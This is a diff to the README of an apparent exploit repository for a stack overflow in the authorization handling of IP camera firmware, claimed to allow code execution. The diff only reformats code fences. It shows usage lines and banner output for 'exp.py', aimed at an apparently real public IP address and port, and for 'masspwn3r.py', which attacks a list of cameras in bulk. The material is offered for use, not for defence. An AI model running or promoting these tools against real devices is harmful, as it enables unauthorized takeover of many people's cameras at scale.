@@ -2,7 +2,8 @@
 Stack overflow through authorization request in the system. Code execution is possible. This vulnerability is present in many camera manufacturers that use this firmware. Perhaps the vulnerability was found before me, but I have not heard anything about this vulnerability
 
 # Usage exp.py:
-```root@kali:~/ipcam-overflow# python3 exp.py 177.139.57.124 8181
+```
+root@kali:~/ipcam-overflow# python3 exp.py 177.139.57.124 8181
 [*]Stack overflow in ip-cameras xD
 [i]Exploit created and tested by @NotEth1calHack3r
 
@@ -14,7 +15,8 @@ Stack overflow through authorization request in the system. Code execution is po
 ```
 
 # Usage masspwn3r.py:
-```root@kali:~/ipcam-overflow# python3 masspwn3r.py list.txt 8081
+```
+root@kali:~/ipcam-overflow# python3 masspwn3r.py list.txt 8081
 [*]Mass stack overflow in ip-cameras :0
 [i]Exploit created and tested by @NotEth1calHack3r
 
